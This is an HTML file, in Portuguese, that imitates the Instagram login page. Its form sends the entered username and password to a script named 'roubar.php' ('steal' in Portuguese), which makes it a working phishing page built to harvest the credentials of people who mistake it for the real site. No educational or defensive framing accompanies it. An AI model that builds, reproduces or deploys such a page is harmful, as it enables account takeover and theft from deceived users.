<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px 40px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 20px 0;
            background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .form-group {
            margin-bottom: 10px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box; /* Importante para não estourar o container */
        }
        .button {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #0077ff;
        }
        .divider {
            margin: 15px 0;
            display: flex;
            align-items: center;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider span {
            padding: 0 10px;
            color: #737373;
            font-size: 13px;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            margin-top: 15px;
        }
        .signup-link {
            margin-top: 20px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            width: 350px;
            text-align: center;
            font-size: 14px;
        }
        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Instagram</div>
        <form action="roubar.php" method="POST">
            <div class="form-group">
                <input type="text" name="username" placeholder="Telefone, nome de usuário ou e-mail" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Senha" required>
            </div>
            <button type="submit" class="button">Entrar</button>
        </form>
        <div class="divider">
            <span>OU</span>
        </div>
        <a href="#" class="facebook-login">Entrar usando o Facebook</a>
        <a href="#" style="display: block; margin-top: 10px; font-size: 12px; color: #00376b;">Esqueceu a senha?</a>
    </div>

    <div class="signup-link">
        Não tem uma conta? <a href="#">Cadastre-se</a>
    </div>

</body>
</html>
